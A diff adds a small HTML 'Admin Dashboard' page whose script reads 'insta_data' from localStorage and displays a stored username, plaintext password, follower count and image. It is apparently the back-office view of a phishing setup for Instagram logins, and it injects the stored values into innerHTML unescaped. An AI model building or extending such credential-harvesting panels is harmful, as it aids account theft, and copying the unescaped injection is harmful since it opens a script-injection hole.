@@ -1,0 +1,35 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Admin Dashboard</title>
+  <style>
+    body { font-family: Arial; background: #f8f9fa; padding: 30px; }
+    h2 { text-align: center; }
+    .data-box { background: #fff; padding: 20px; border-radius: 10px; max-width: 500px; margin: auto; }
+    img { max-width: 100px; border-radius: 50%; }
+  </style>
+</head>
+<body>
+  <h2>Admin Dashboard</h2>
+  <div class="data-box" id="dataBox">
+    <p>Loading data...</p>
+  </div>
+  <script>
+    const data = JSON.parse(localStorage.getItem("insta_data"));
+    const box = document.getElementById("dataBox");
+    if (data) {
+      box.innerHTML = `
+        <p><strong>Username:</strong> ${data.username}</p>
+        <p><strong>Password:</strong> ${data.password}</p>
+        <p><strong>Followers:</strong> ${data.followers}</p>
+        <p><strong>Image:</strong><br/><img src="${data.image}" /></p>
+      `;
+    } else {
+      box.innerHTML = "<p>No data found.</p>";
+    }
+  </script>
+</body>
+</html>
